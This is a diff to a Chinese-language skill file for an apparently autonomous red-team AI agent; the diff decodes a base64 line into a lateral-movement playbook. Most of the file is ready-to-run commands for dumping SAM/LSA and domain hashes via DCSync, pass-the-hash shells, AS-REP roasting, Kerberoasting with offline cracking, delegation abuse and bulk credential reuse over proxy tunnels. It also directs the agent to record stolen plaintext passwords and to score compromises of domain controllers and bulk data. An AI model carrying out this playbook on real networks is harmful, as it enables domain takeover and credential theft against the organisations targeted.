@@ -1,1 +1,148 @@
-LS0tCm5hbWU6IGxhdGVyYWwtbW92ZW1lbnQKZGVzY3JpcHRpb246IOWGhee9keaoquWQkeS4juaPkOadg++8mkltcGFja2V0IOWll+S7tu+8iFB0SC9Qc0V4ZWMvV01JL0RDT00vS2VyYmVyb3Mv5Yet5o2u6L2s5YKo77yJKyBlbnVtNGxpbnV4L3NtYmNsaWVudCDkv6Hmga/mnprkuL4Kd2hlblRvVXNlOiDlt7Lov5vlhoXnvZHvvIzpnIDopoHnlKjlt7LmnInlh63mja7miJblk4jluIzmqKrlkJHliLDlhbblroPkuLvmnLrjgIHmnprkuL7ln5/njq/looPjgIFkdW1wIOWHreaNruOAgeaJvuWfn+aOp+i3r+W+hApyb2xlOiBpbnRlcm5hbAplbmFibGVkOiB0cnVlCi0tLQoKIyDlhoXnvZHmqKrlkJHkuI7mj5DmnYPvvIhJbXBhY2tldCDlpZfku7bvvIkKCuaLv+WIsOS4gOWPsOacuuWZqOWSjOWGhee9keWPr+i+vuaAp+S5i+WQju+8jCoq5qiq5ZCR5Yiw5pu05aSa5Li75py6KirvvIhgc2VydmVyLWhvc3Rg77yJ5ZKMKirmib7liLDln5/mjqcv5qC45b+D57O757ufKirvvIhgY2VudHJhbC1zeXN0ZW1g77yJCuaYr+WGhee9kemYtuauteeahOS4u+e6v+OAguacrOacuuW3suijhSAqKjYxIOS4qiBgaW1wYWNrZXQtKmAg5ZG95LukKirvvIhLYWxpIOiHquW4pu+8ie+8jOaYr+acrOmYtuauteeahOS4u+WKm+W3peWFt+mbhuOAggoKIyMg5pys5py65bel5YW3Cgp8IOW3peWFtyB8IOi3r+W+hCB8IOeUqOmAlCB8CnwgLS0tIHwgLS0tIHwgLS0tIHwKfCBJbXBhY2tldCDlpZfku7YgfCBgL3Vzci9iaW4vaW1wYWNrZXQtKmDvvIg2MSDkuKrlkb3ku6TvvIkgfCDljY/orq7nuqfmqKrlkJHjgIHlh63mja7ovazlgqjjgIFLZXJiZXJvcyDmlLvlh7sgfAp8IGVudW00bGludXggfCBgL3Vzci9iaW4vZW51bTRsaW51eGAgfCBTTUIv5Z+f5L+h5oGv5p6a5Li+77yI55So5oi344CB5YWx5Lqr44CB562W55Wl77yJIHwKfCBzbWJjbGllbnQgfCBgL3Vzci9iaW4vc21iY2xpZW50YCB8IOWFseS6q+a1j+iniOS4juivu+WGmSB8CnwgbmJ0c2NhbiB8IGAvdXNyL2Jpbi9uYnRzY2FuYCB8IE5ldEJJT1Mg5ZCN56ew5omr5o+PIHwKfCBwcm94eWNoYWluczQgfCBgL3Vzci9iaW4vcHJveHljaGFpbnM0YCB8IOi1sOmap+mBk+iuv+mXruWGhee9ke+8iCoq5Y+q55SoIGAtZmAg5Li05pe26YWN572uKirvvIkgfAoKIyMg6Zu244CB5YWI5YGa55qE5LqL77yI5L+h5oGv5Yaz5a6a5omT5rOV77yJCgpgYGBiYXNoCiMgMSkg55yL5oiR5pyJ5LuA5LmI77yI5Yet5o2uL+WTiOW4jC/ln5/kv6Hmga/vvIkKIyAgICByZWR0ZWFtX2NyZWRlbnRpYWxfbGlzdCAvIHJlZHRlYW1fYWNjZXNzX2xpc3QgLyByZWR0ZWFtX2Fzc2V0X3F1ZXJ5CiMgMikg5p6a5Li+5Z+f546v5aKD77yI5pyJ5Z+f6LSm5Y+35ZCO77yJCmltcGFja2V0LUdldEFEVXNlcnMgPGRvbWFpbj4vPHVzZXI+OjxwYXNzPiAtZGMtaXAgPERDX0lQPiAtYWxsCmltcGFja2V0LUdldEFEQ29tcHV0ZXJzIDxkb21haW4+Lzx1c2VyPjo8cGFzcz4gLWRjLWlwIDxEQ19JUD4KZW51bTRsaW51eCAtYSA8dGFyZ2V0PiAgICAgICAgICAgICAgICMg5peg5Yet5o2u5Lmf6IO95p6a5Li+5Ye655So5oi3L+WFseS6qy/nrZbnlaUKCiMgMykg5YWx5Lqr5LiO5paH5Lu2CnNtYmNsaWVudCAtTCAvLzx0YXJnZXQ+IC1OICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMg56m65Lya6K+d5YiX5YWx5LqrCnNtYmNsaWVudCAvLzx0YXJnZXQ+LzxzaGFyZT4gLVUgPHVzZXI+JTxwYXNzPiAgICAgICAgICAgICAgICAjIOivu+WFseS6qwppbXBhY2tldC1zbWJjbGllbnQgPGRvbWFpbj4vPHVzZXI+OjxwYXNzPkA8dGFyZ2V0PiAgICAgICAgICAgIyDkuqTkupLlvI/vvIzlj68gY2QvbHMvZ2V0L3B1dApgYGAKCioq5YaF572R5omr5o+P5LuN55SoIGdvZ28vZnNjYW4qKu+8iOaKgOiDvSBgZ29nby1pbnRyYW5ldGAgLyBgZnNjYW4taW50cmFuZXRg77yJ4oCU4oCU5pys5oqA6IO96LSf6LSjIui/m+WOu+S5i+WQjuaAjuS5iOi1sCLjgIIKCiMjIOS4gOOAgeWHreaNrui9rOWCqO+8iOaLv+WIsOS4gOWPsOacuuWZqOWQjueahOesrOS4gOS8mOWFiO+8iQoKYGBgYmFzaAojIDEpIOi/nOeoiyBkdW1wIFNBTS9MU0EvU0VDUkVUU++8iOmcgOeuoeeQhuWRmOWHreaNru+8iQppbXBhY2tldC1zZWNyZXRzZHVtcCA8ZG9tYWluPi88dXNlcj46PHBhc3M+QDx0YXJnZXQ+CmltcGFja2V0LXNlY3JldHNkdW1wIC1oYXNoZXMgOjxOVGhhc2g+IDxkb21haW4+Lzx1c2VyPkA8dGFyZ2V0PiAgICAjIOeUqOWTiOW4jOebtOaOpSBkdW1wCgojIDIpIOWPqiBkdW1wIOacrOWcsCBTQU0KaW1wYWNrZXQtc2VjcmV0c2R1bXAgLXNhbSBzYW0uaGl2ZSAtc3lzdGVtIHN5c3RlbS5oaXZlIExPQ0FMCgojIDMpIERDU3luY++8iOacieWfn+euoS/lpI3liLbmnYPpmZDml7bvvIznm7TmjqXmi7/ln5/lhoXmiYDmnInlk4jluIzvvInigJTigJQg55u06YCa5Z+f5o6n55qE5YWz6ZSu5LiA5q2lCmltcGFja2V0LXNlY3JldHNkdW1wIDxkb21haW4+LzxhZG1pbj46PHBhc3M+QDxEQ19JUD4gLWp1c3QtZGMKCiMgNCkg5oqT5piO5paHL+elqOaNru+8mumFjeWQiOebruagh+S+p+W3peWFt++8iOWmgiBtaW1pa2F0eu+8ieaIliBsc2Fzc3kKIyAgICDlk4jluIzmi7/liLDlkI7nlKggY3JlZGVudGlhbC1hdHRhY2sg56a757q/56C06Kej77yM5oiW55u05o6lIFB0SO+8iOingeS4i++8iQpgYGAKCioq6L6T5Ye65aSE55CGKirvvJpkdW1wIOWHuueahCBgTlRMTWAg5ZOI5biM6YCQ5p2hIGByZWR0ZWFtX2NyZWRlbnRpYWxfYWRkYO+8iGBzb3VyY2U95Yet5o2u6L2s5YKoYO+8jArmmI7mlofnmoTlj6Pku6TlhpkgYHNlY3JldF92YWx1ZWDvvIzlk4jluIzlhpkgYG5vdGVgIOaIliBgc2VjcmV0X3ZhbHVlYCDlubbmoIfms6jnsbvlnovvvInvvIzmlofku7blrZggYHJ1bnMvYOOAggoKIyMg5LqM44CBUGFzcy10aGUtSGFzaO+8iFB0SO+8jOS4jeeUqOegtOino+ebtOaOpeaoquWQke+8iQoKYGBgYmFzaAojIOWRveS7pOaJp+ihjAppbXBhY2tldC1wc2V4ZWMgIC1oYXNoZXMgOjxOVGhhc2g+IDxkb21haW4+Lzx1c2VyPkA8dGFyZ2V0PiAgICAgICAgICAjIOS6pOS6kuW8jyBTWVNURU0gc2hlbGzvvIjlmarlo7DlpKfvvIkKaW1wYWNrZXQtd21pZXhlYyAtaGFzaGVzIDo8TlRoYXNoPiA8ZG9tYWluPi88dXNlcj5APHRhcmdldD4gICAgICAgICAgIyDljYrkuqTkupLvvIzlmarlo7DovoPlsI/vvIjmjqjojZDvvIkKaW1wYWNrZXQtYXRleGVjICAtaGFzaGVzIDo8TlRoYXNoPiA8ZG9tYWluPi88dXNlcj5APHRhcmdldD4gIndob2FtaSIgIyDljZXlkb3ku6TvvIzmnIDlronpnZkKaW1wYWNrZXQtc21iZXhlYyAtaGFzaGVzIDo8TlRoYXNoPiA8ZG9tYWluPi88dXNlcj5APHRhcmdldD4gICAgICAgICAgIyDpgJrov4fmnI3liqHmiafooYwKCiMg5ou/5paH5Lu2CmltcGFja2V0LXNtYmNsaWVudCAtaGFzaGVzIDo8TlRoYXNoPiA8ZG9tYWluPi88dXNlcj5APHRhcmdldD4KCiMg5pWw5o2u5bqTCmltcGFja2V0LW1zc3FsY2xpZW50IC1oYXNoZXMgOjxOVGhhc2g+IDxkb21haW4+Lzx1c2VyPkA8dGFyZ2V0PgpgYGAKCioqcHNleGVjIOS8muiQveWcsOacjeWKoeOAgeWZquWjsOWkp+OAgeWPr+iDveiiq+adgOi9r+aLpioq77yb5LyY5YWIIGB3bWlleGVjYC9gYXRleGVjYOOAggoKIyMg5LiJ44CBS2VyYmVyb3Mg5pS75Ye777yI5pyJ5Z+f546v5aKD5pe277yJCgpgYGBiYXNoCiMgMSkg55So5oi35ZCN5p6a5Li+ICsgQVMtUkVQIOaKk+WPlu+8iOS4jemcgOimgeWvhuegge+8jOaJvuS4jemcgOimgemihOiupOivgeeahOi0puWPt++8iQppbXBhY2tldC1HZXROUFVzZXJzIDxkb21haW4+LyAtdXNlcnNmaWxlIHJ1bnMvdXNlcnMudHh0IC1kYy1pcCA8RENfSVA+IC1mb3JtYXQgaGFzaGNhdCAtb3V0cHV0ZmlsZSBydW5zL2FzcmVwLnR4dApoYXNoY2F0IC1tIDE4MjAwIHJ1bnMvYXNyZXAudHh0IC91c3Ivc2hhcmUvd29yZGxpc3RzL3JvY2t5b3UudHh0ICAgICAgIyDnprvnur/noLTop6MKCiMgMikgS2VyYmVyb2FzdGluZ++8iOaJvuaciSBTUE4g55qE5pyN5Yqh6LSm5Y+377yM5oqTIFRHUyDnprvnur/noLTop6PvvIkKaW1wYWNrZXQtR2V0VXNlclNQTnMgPGRvbWFpbj4vPHVzZXI+OjxwYXNzPiAtZGMtaXAgPERDX0lQPiAtcmVxdWVzdCAtb3V0cHV0ZmlsZSBydW5zL2tlcmJlcm9hc3QudHh0Cmhhc2hjYXQgLW0gMTMxMDAgcnVucy9rZXJiZXJvYXN0LnR4dCAvdXNyL3NoYXJlL3dvcmRsaXN0cy9yb2NreW91LnR4dAoKIyAzKSDnpajmja7nlLPor7fkuI7kvb/nlKgKaW1wYWNrZXQtZ2V0VEdUIDxkb21haW4+Lzx1c2VyPjo8cGFzcz4gLWRjLWlwIDxEQ19JUD4gICAgICAgICAgICAjIOeUs+ivtyBUR1Qg4oaSIC5jY2FjaGUKZXhwb3J0IEtSQjVDQ05BTUU9L3BhdGgvdG8vdXNlci5jY2FjaGUKaW1wYWNrZXQtd21pZXhlYyAtayAtbm8tcGFzcyA8ZG9tYWluPi88dXNlcj5APHRhcmdldD4gICAgICAgICAgICAjIOeUqOelqOaNruaoquWQkQoKIyA0KSDlp5TmtL7mlLvlh7vvvIjln5/lhoXmj5DmnYPot6/lvoTvvIkKaW1wYWNrZXQtZmluZERlbGVnYXRpb24gPGRvbWFpbj4vPHVzZXI+OjxwYXNzPiAtZGMtaXAgPERDX0lQPgppbXBhY2tldC1nZXRTVCAtc3BuIDxzcG4+IC1pbXBlcnNvbmF0ZSBhZG1pbmlzdHJhdG9yIDxkb21haW4+Lzx1c2VyPjo8cGFzcz4KYGBgCgojIyDlm5vjgIHlh63mja7lpI3nlKjvvIjmr5TmlLvlh7vlv6vlvpflpJrvvIzmsLjov5zlhYjor5XvvIkKCuaLv+WIsOS7u+S9lei0puWPty/lk4jluIzlkI4qKuWFiOaoquWQkeivlSoq77yM6ICM5LiN5piv5oCl552A5omT5paw5ryP5rSe77yaCjEuIOWQjOS4gOWPo+S7pOivleWFtuWug+S4u+acuu+8iGB3bWlleGVjYCDmibnph4/vvIkrIOWFtuWug+WNj+iuru+8iFNNQi9XaW5STS9SRFAvU1NIL01TU1FML015U1FM77yJ77ybCjIuIOacrOWcsOeuoeeQhuWRmOWPo+S7pOWkjeeUqO+8iOWQjOmVnOWDj+aJuemHj+ijheacuueahOacuuWZqOW4uOWQjOWPo+S7pO+8ieKAlOKAlCoq6L+Z5piv5YaF572R5qiq5ZCR5ZG95Lit546H5pyA6auY55qE5LiA5oubKirvvJsKMy4g5Z+f6LSm5Y+3IOKGkiDor5Xln5/lhoXmiYDmnInmnLrlmajjgIHlhbHkuqvjgIFPQS/pgq7ku7Yv5aCh5Z6S5py6L+i/kOe7tOW5s+WPsOWQjuWPsO+8mwo0LiDlk4jluIwg4oaSIFB0SCDliLDmiYDmnInlj6/ovr7kuLvmnLrvvIjlhpnkuKrlvqrnjq/vvIzphY3lkIggYHJ1bnMvaG9zdHMudHh0YO+8ieOAggoKIyMg5LqU44CB6Zqn6YGT6YWN5ZCI77yI5YaF572R55uu5qCH5LiN5Y+v55u06L+e5pe277yJCgpgYGBiYXNoCiMg5omA5pyJ5ZG95Luk5YqgIHByb3h5Y2hhaW5zNO+8jOeUqOS4tOaXtumFjee9ru+8iOS4jeimgeaUueezu+e7n+mFjee9ru+8iQpjYXQgPiBydW5zL3Byb3h5Y2hhaW5zLTEwODAuY29uZiA8PCdFT0YnCnN0cmljdF9jaGFpbgpwcm94eV9kbnMKW1Byb3h5TGlzdF0Kc29ja3M1IDEyNy4wLjAuMSAxMDgwCkVPRgoKcHJveHljaGFpbnM0IC1mIHJ1bnMvcHJveHljaGFpbnMtMTA4MC5jb25mIGltcGFja2V0LXdtaWV4ZWMgLWhhc2hlcyA6PGhhc2g+IDxkb21haW4+Lzx1c2VyPkAxMC4wLjAuNQpwcm94eWNoYWluczQgLWYgcnVucy9wcm94eWNoYWlucy0xMDgwLmNvbmYgZW51bTRsaW51eCAtYSAxMC4wLjAuNgojIOKaoO+4jyDms6jmhI/vvJpwcm94eWNoYWlucyDlj6rku6PnkIYgVENQ77ybS2VyYmVyb3Mg55qEIFVEUCDpg6jliIbkuI7pg6jliIblj43ov57lnLrmma/pnIDopoEgY2hpc2VsL2ZycCDnmoTnq6/lj6PmmKDlsIQKYGBgCgojIyDlha3jgIHnuqrlvovkuI7ovrnnlYwKCjEuICoq5pS25pWb5LyY5YWIKirvvJrlhoXnvZHpmLbmrrXnmoTnm67moIfmmK8qKuaguOW/g+ezu+e7nyoq77yI5Z+f5o6nIC8g5aCh5Z6S5py6IC8g6L+Q57u05bmz5Y+wIC8g5pWw5o2u5bqT6ZuG576kIC8g5Luj56CB5LuT5bqTIC8g5aSH5Lu957O757uf77yJ77yMCiAgIOS4jeaYr+aKiuavj+WPsOacuuWZqOmDveaJk+S4gOmBjeOAguaoquWQkeWPquaYr+aJi+aute+8jOW+l+WIhueCueaYryBgc2VydmVyLWhvc3RgIOS4jiBgY2VudHJhbC1zeXN0ZW1g44CCCjIuICoq5Zmq5aOw5o6n5Yi2KirvvJpgcHNleGVjYCDokL3lnLDmnI3liqHjgIFgc2VjcmV0c2R1bXBgIOinpueisCBMU0FTU++8jOmDveS8muiiqyBFRFIg55uv5LiK77ybCiAgIOS8mOWFiCBgd21pZXhlY2AvYGF0ZXhlY2DvvIzmjqfliLbpopHnjofvvIzliKvlr7nmlbTmrrXlgZrmmrTlipvmqKrlkJHjgIIKMy4gKirkuI3opoHmioroh6rlt7HmiZPplIEqKu+8muWfn+i0puWPt+i/nue7reWksei0peS8mumUgeWumuetlueVpe+8m+WFiOeUqOeOsOaIkOWHreaNruWkjeeUqO+8jOW8seWPo+S7pOeIhuegtOaMieaKgOiDvSBgY3JlZGVudGlhbC1hdHRhY2tgIOeahOmZkOa1gee6quW+i+OAggo0LiAqKuegtOWdj+aAp+aTjeS9nOemgeatoioq77ya5LiN6KaB5YGc5pyN5Yqh44CB5LiN6KaB5pS557O757uf6YWN572u44CB5LiN6KaB5Yig5pel5b+X77yI6Zmk6Z2e5ryU57uD5piO56Gu6KaB5rGC5LiU55So5oi35ZCM5oSP77yJ44CCCjUuICoq5q+P5Y+w5paw5Li75py66YO96KaB55m76K6wKirvvJpgcmVkdGVhbV9hc3NldF9hZGRg77yI5YaF572R6LWE5Lqn77yMYHNjb3BlYCDoh6rliqggaW50ZXJuYWzvvInvvIwKICAg6K6/6Zeu5oiQ5YqfIGByZWR0ZWFtX2FjY2Vzc19hZGRg77yM5Yet5o2uIGByZWR0ZWFtX2NyZWRlbnRpYWxfYWRkYOOAggoKIyMg5LiD44CB6L6T5Ye65LiO6JC95bqT77yI5by65Yi277yJCgoxLiAqKuavj+WPsOaIkOWKn+aoquWQkeeahOS4u+acuuiusOWIhioq77yaYHJlZHRlYW1fc2NvcmVfaGl0YO+8iGBzZXJ2ZXItaG9zdGDvvInvvIxgZXZpZGVuY2VgIOWGmQogICDjgIzmupDkuLvmnLog4oaSIOebruagh+S4u+acujrnq6/lj6PvvZznlKjku4DkuYjlh63mja4v5ZOI5biM772c5omn6KGM57uT5p6c44CN77yI5aaCIGAxMC4wLjAuNSDihpIgMTAuMC4wLjk6NDQ1772cUHRIIOacrOWcsOeuoeeQhuWRmOWTiOW4jO+9nHdob2FtaT1udCBhdXRob3JpdHlcc3lzdGVtYO+8ieOAggoyLiAqKuaguOW/g+ezu+e7n+iusOWIhioq77ya5omT5Yiw5Z+f5o6nL+WgoeWekuacui/ov5Dnu7TlubPlj7Av5pWw5o2u5bqT6ZuG576kIOKGkiBgY2VudHJhbC1zeXN0ZW1g77ybCiAgIOaLv+WIsOWkp+mHj+aVsOaNriDihpIgYGJpZ2RhdGEtc3lzdGVtYO+8iCoq5b+F6aG75YaZ5a6e6ZmF5p2h5pWw77yM4omlMTAwIOS4h+adoeaJjeeulyoq77yJ44CCCjMuICoq5Yet5o2u6JC95bqTKirvvJpgcmVkdGVhbV9jcmVkZW50aWFsX2FkZGDvvIxgc291cmNlYCDlhpnmuIXvvIhg5Yet5o2u6L2s5YKoYC9gS2VyYmVyb2FzdGluZ2AvYEFTLVJFUGAvYOWHreaNruWkjeeUqGAvYOemu+e6v+egtOino2DvvInvvIwKICAgYHRvb2xgIOWGmeWunumZheWRveS7pOWOn+aWh++8jOaYjuaWh+WPo+S7pOWGmSBgc2VjcmV0X3ZhbHVlYO+8jOaWh+S7tui3r+W+hOWGmSBgc2VjcmV0X3JlZmDjgIIKNC4gKirorr/pl67kvJror53okL3lupMqKu+8mmByZWR0ZWFtX2FjY2Vzc19hZGRg77yIYG1ldGhvZD1zbWJgL2B3bWlgL2BwdGhgL2BrZXJiZXJvc2AvYHNzaGAvYHJkcGDvvInjgIIKNS4g5q+P5Liq5YWz6ZSu5Yqo5L2cIGByZWR0ZWFtX2NoYWluX2FkZGDvvJpgc3RhZ2VfY29kZT1pbnRlcm5hbGDvvIjlhoXnvZHmi7/mnYPpmZDvvInmiJYgYHRhcmdldGDvvIjmi7/pnbbmoIfvvInvvIwKICAgKipgdG9vbGAg5YaZ5a6e6ZmF5ZG95Luk5Y6f5paHKirvvIjlkKsgYC1oYXNoZXNg44CBYC1rIC1uby1wYXNzYCDnrYnlhbPplK7lj4LmlbDvvIzku6Xlj4ogYHByb3h5Y2hhaW5zNCAtZiAuLi5gIOWJjee8gO+8ie+8jAogICBgcmVzdWx0YCDlhpnlm57mmL7mkZjopoHigJTigJTmiqXlkYropoHog73nhafnnYDlpI3njrDjgIIKNi4gKirlm57loavnn6Xor4blupMqKu+8mumqjOivgeacieaViOeahOmAmueUqOWIqeeUqOiEmuacrCBgcmVkdGVhbV9wb2NfYWRkYO+8iOW4piBgY2F0ZWdvcnlgICsgYGVuZ2FnZW1lbnRgICsgYGFzc2V0X3RhcmdldGAgKyBgdmVyaWZpZWRfbm90ZWDvvIzohLHmlY/vvInjgIIK
+---
+name: lateral-movement
+description: 内网横向与提权：Impacket 套件（PtH/PsExec/WMI/DCOM/Kerberos/凭据转储）+ enum4linux/smbclient 信息枚举
+whenToUse: 已进内网，需要用已有凭据或哈希横向到其它主机、枚举域环境、dump 凭据、找域控路径
+role: internal
+enabled: true
+---
+
+# 内网横向与提权（Impacket 套件）
+
+拿到一台机器和内网可达性之后，**横向到更多主机**（`server-host`）和**找到域控/核心系统**（`central-system`）
+是内网阶段的主线。本机已装 **61 个 `impacket-*` 命令**（Kali 自带），是本阶段的主力工具集。
+
+## 本机工具
+
+| 工具 | 路径 | 用途 |
+| --- | --- | --- |
+| Impacket 套件 | `/usr/bin/impacket-*`（61 个命令） | 协议级横向、凭据转储、Kerberos 攻击 |
+| enum4linux | `/usr/bin/enum4linux` | SMB/域信息枚举（用户、共享、策略） |
+| smbclient | `/usr/bin/smbclient` | 共享浏览与读写 |
+| nbtscan | `/usr/bin/nbtscan` | NetBIOS 名称扫描 |
+| proxychains4 | `/usr/bin/proxychains4` | 走隧道访问内网（**只用 `-f` 临时配置**） |
+
+## 零、先做的事（信息决定打法）
+
+```bash
+# 1) 看我有什么（凭据/哈希/域信息）
+#    redteam_credential_list / redteam_access_list / redteam_asset_query
+# 2) 枚举域环境（有域账号后）
+impacket-GetADUsers <domain>/<user>:<pass> -dc-ip <DC_IP> -all
+impacket-GetADComputers <domain>/<user>:<pass> -dc-ip <DC_IP>
+enum4linux -a <target>               # 无凭据也能枚举出用户/共享/策略
+
+# 3) 共享与文件
+smbclient -L //<target> -N                                  # 空会话列共享
+smbclient //<target>/<share> -U <user>%<pass>                # 读共享
+impacket-smbclient <domain>/<user>:<pass>@<target>           # 交互式，可 cd/ls/get/put
+```
+
+**内网扫描仍用 gogo/fscan**（技能 `gogo-intranet` / `fscan-intranet`）——本技能负责"进去之后怎么走"。
+
+## 一、凭据转储（拿到一台机器后的第一优先）
+
+```bash
+# 1) 远程 dump SAM/LSA/SECRETS（需管理员凭据）
+impacket-secretsdump <domain>/<user>:<pass>@<target>
+impacket-secretsdump -hashes :<NThash> <domain>/<user>@<target>    # 用哈希直接 dump
+
+# 2) 只 dump 本地 SAM
+impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+
+# 3) DCSync（有域管/复制权限时，直接拿域内所有哈希）—— 直通域控的关键一步
+impacket-secretsdump <domain>/<admin>:<pass>@<DC_IP> -just-dc
+
+# 4) 抓明文/票据：配合目标侧工具（如 mimikatz）或 lsassy
+#    哈希拿到后用 credential-attack 离线破解，或直接 PtH（见下）
+```
+
+**输出处理**：dump 出的 `NTLM` 哈希逐条 `redteam_credential_add`（`source=凭据转储`，
+明文的口令写 `secret_value`，哈希写 `note` 或 `secret_value` 并标注类型），文件存 `runs/`。
+
+## 二、Pass-the-Hash（PtH，不用破解直接横向）
+
+```bash
+# 命令执行
+impacket-psexec  -hashes :<NThash> <domain>/<user>@<target>          # 交互式 SYSTEM shell（噪声大）
+impacket-wmiexec -hashes :<NThash> <domain>/<user>@<target>          # 半交互，噪声较小（推荐）
+impacket-atexec  -hashes :<NThash> <domain>/<user>@<target> "whoami" # 单命令，最安静
+impacket-smbexec -hashes :<NThash> <domain>/<user>@<target>          # 通过服务执行
+
+# 拿文件
+impacket-smbclient -hashes :<NThash> <domain>/<user>@<target>
+
+# 数据库
+impacket-mssqlclient -hashes :<NThash> <domain>/<user>@<target>
+```
+
+**psexec 会落地服务、噪声大、可能被杀软拦**；优先 `wmiexec`/`atexec`。
+
+## 三、Kerberos 攻击（有域环境时）
+
+```bash
+# 1) 用户名枚举 + AS-REP 抓取（不需要密码，找不需要预认证的账号）
+impacket-GetNPUsers <domain>/ -usersfile runs/users.txt -dc-ip <DC_IP> -format hashcat -outputfile runs/asrep.txt
+hashcat -m 18200 runs/asrep.txt /usr/share/wordlists/rockyou.txt      # 离线破解
+
+# 2) Kerberoasting（找有 SPN 的服务账号，抓 TGS 离线破解）
+impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <DC_IP> -request -outputfile runs/kerberoast.txt
+hashcat -m 13100 runs/kerberoast.txt /usr/share/wordlists/rockyou.txt
+
+# 3) 票据申请与使用
+impacket-getTGT <domain>/<user>:<pass> -dc-ip <DC_IP>            # 申请 TGT → .ccache
+export KRB5CCNAME=/path/to/user.ccache
+impacket-wmiexec -k -no-pass <domain>/<user>@<target>            # 用票据横向
+
+# 4) 委派攻击（域内提权路径）
+impacket-findDelegation <domain>/<user>:<pass> -dc-ip <DC_IP>
+impacket-getST -spn <spn> -impersonate administrator <domain>/<user>:<pass>
+```
+
+## 四、凭据复用（比攻击快得多，永远先试）
+
+拿到任何账号/哈希后**先横向试**，而不是急着打新漏洞：
+1. 同一口令试其它主机（`wmiexec` 批量）+ 其它协议（SMB/WinRM/RDP/SSH/MSSQL/MySQL）；
+2. 本地管理员口令复用（同镜像批量装机的机器常同口令）——**这是内网横向命中率最高的一招**；
+3. 域账号 → 试域内所有机器、共享、OA/邮件/堡垒机/运维平台后台；
+4. 哈希 → PtH 到所有可达主机（写个循环，配合 `runs/hosts.txt`）。
+
+## 五、隧道配合（内网目标不可直连时）
+
+```bash
+# 所有命令加 proxychains4，用临时配置（不要改系统配置）
+cat > runs/proxychains-1080.conf <<'EOF'
+strict_chain
+proxy_dns
+[ProxyList]
+socks5 127.0.0.1 1080
+EOF
+
+proxychains4 -f runs/proxychains-1080.conf impacket-wmiexec -hashes :<hash> <domain>/<user>@10.0.0.5
+proxychains4 -f runs/proxychains-1080.conf enum4linux -a 10.0.0.6
+# ⚠️ 注意：proxychains 只代理 TCP；Kerberos 的 UDP 部分与部分反连场景需要 chisel/frp 的端口映射
+```
+
+## 六、纪律与边界
+
+1. **收敛优先**：内网阶段的目标是**核心系统**（域控 / 堡垒机 / 运维平台 / 数据库集群 / 代码仓库 / 备份系统），
+   不是把每台机器都打一遍。横向只是手段，得分点是 `server-host` 与 `central-system`。
+2. **噪声控制**：`psexec` 落地服务、`secretsdump` 触碰 LSASS，都会被 EDR 盯上；
+   优先 `wmiexec`/`atexec`，控制频率，别对整段做暴力横向。
+3. **不要把自己打锁**：域账号连续失败会锁定策略；先用现成凭据复用，弱口令爆破按技能 `credential-attack` 的限流纪律。
+4. **破坏性操作禁止**：不要停服务、不要改系统配置、不要删日志（除非演练明确要求且用户同意）。
+5. **每台新主机都要登记**：`redteam_asset_add`（内网资产，`scope` 自动 internal），
+   访问成功 `redteam_access_add`，凭据 `redteam_credential_add`。
+
+## 七、输出与落库（强制）
+
+1. **每台成功横向的主机记分**：`redteam_score_hit`（`server-host`），`evidence` 写
+   「源主机 → 目标主机:端口｜用什么凭据/哈希｜执行结果」（如 `10.0.0.5 → 10.0.0.9:445｜PtH 本地管理员哈希｜whoami=nt authority\system`）。
+2. **核心系统记分**：打到域控/堡垒机/运维平台/数据库集群 → `central-system`；
+   拿到大量数据 → `bigdata-system`（**必须写实际条数，≥100 万条才算**）。
+3. **凭据落库**：`redteam_credential_add`，`source` 写清（`凭据转储`/`Kerberoasting`/`AS-REP`/`凭据复用`/`离线破解`），
+   `tool` 写实际命令原文，明文口令写 `secret_value`，文件路径写 `secret_ref`。
+4. **访问会话落库**：`redteam_access_add`（`method=smb`/`wmi`/`pth`/`kerberos`/`ssh`/`rdp`）。
+5. 每个关键动作 `redteam_chain_add`：`stage_code=internal`（内网拿权限）或 `target`（拿靶标），
+   **`tool` 写实际命令原文**（含 `-hashes`、`-k -no-pass` 等关键参数，以及 `proxychains4 -f ...` 前缀），
+   `result` 写回显摘要——报告要能照着复现。
+6. **回填知识库**：验证有效的通用利用脚本 `redteam_poc_add`（带 `category` + `engagement` + `asset_target` + `verified_note`，脱敏）。
